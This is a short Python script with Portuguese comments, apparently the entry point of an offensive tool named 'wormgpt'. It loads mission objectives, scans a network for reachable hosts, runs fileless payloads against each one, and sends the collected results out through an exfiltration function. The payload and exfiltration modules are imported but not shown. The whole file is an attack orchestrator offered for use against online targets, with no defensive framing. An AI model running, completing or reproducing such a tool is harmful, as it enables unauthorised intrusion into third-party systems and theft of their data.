from wormgpt.scan import scan_network_from_objectives
from wormgpt.payloads.fileless import execute_payload
from wormgpt.exfil import send_exfiltration
import json

def main():
    # Carrega objetivos da missão
    with open("wormgpt/objectives.json") as f:
        mission = json.load(f)

    print("\n[🎯] Missão: Executar objetivos definidos contra alvos online.\n")

    # Scan ativo da rede com IA
    targets = scan_network_from_objectives()

    for host in targets:
        if host.get("reachable"):
            print(f"\n[✅] Alvo válido identificado: {host['ip']}")
            payload_result = execute_payload(host['ip'], goals=mission.get("goals", []))

            if payload_result:
                # Serializa para envio
                json_payload = json.dumps(payload_result)
                send_exfiltration(json_payload)
        else:
            print(f"[⚠️] Alvo {host['ip']} indisponível. Pulando.\n")

if __name__ == "__main__":
    main()
